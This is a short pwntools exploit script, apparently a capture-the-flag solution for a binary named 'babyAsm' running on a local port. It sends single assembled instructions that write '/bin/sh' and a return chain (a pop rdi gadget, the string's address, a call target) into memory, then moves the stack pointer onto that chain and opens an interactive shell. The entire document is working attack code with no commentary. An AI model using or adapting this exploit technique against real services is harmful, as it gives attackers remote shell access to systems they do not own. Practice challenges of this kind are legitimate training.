#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

#r = process('./babyAsm')
#gdb.attach(r)
r = remote('localhost',33332)

r.send(asm('mov r15,[rbp]'))
r.send(asm('add r15,1'))
r.send(asm('mov r14,r15;ret'))

sh = '/bin/sh\x00'
for b in sh:
    r.send(asm('mov byte ptr[r15],'+hex(ord(b))))
    r.send(asm('inc r15;ret'))

r.send(asm('sub r15,1'))
pop_rdi = p64(0x4009d3)
for b in pop_rdi:
    r.send(asm('mov byte ptr[r15],'+hex(ord(b))))
    r.send(asm('inc r15;ret'))

# sh_addr
for i in range(8):
    r.send(asm('mov byte ptr[r15],r14b;ret'))
    for j in range(8):
        r.send(asm('shr r14,1;ret'))
    r.send(asm('inc r15;ret'))

hack = p64(0x400757)
for b in hack:
    r.send(asm('mov byte ptr[r15],'+hex(ord(b))))
    r.send(asm('inc r15;ret'))

#raw_input('#')
r.send(asm('lea rsp,[r15-0x18]'))

r.interactive()
r.close()
